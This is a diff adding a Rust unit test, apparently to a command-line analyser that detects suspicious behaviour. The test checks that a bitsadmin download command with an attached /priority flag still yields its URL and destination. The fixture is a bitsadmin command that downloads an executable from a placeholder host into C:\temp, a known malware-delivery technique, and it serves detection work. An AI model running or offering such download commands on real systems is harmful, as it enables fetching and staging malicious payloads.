@@ -13226,6 +13226,25 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_attached_priority_does_not_skip_url() {
+        let raw =
+            "bitsadmin /transfer myjob /download /priority:foreground http://x/y.exe C:\\temp\\y.exe";
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
+            )
+        });
+        assert!(
+            has,
+            "attached-priority BitsadminDownload skipped URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_transfer_emits_multiple_download_pairs() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
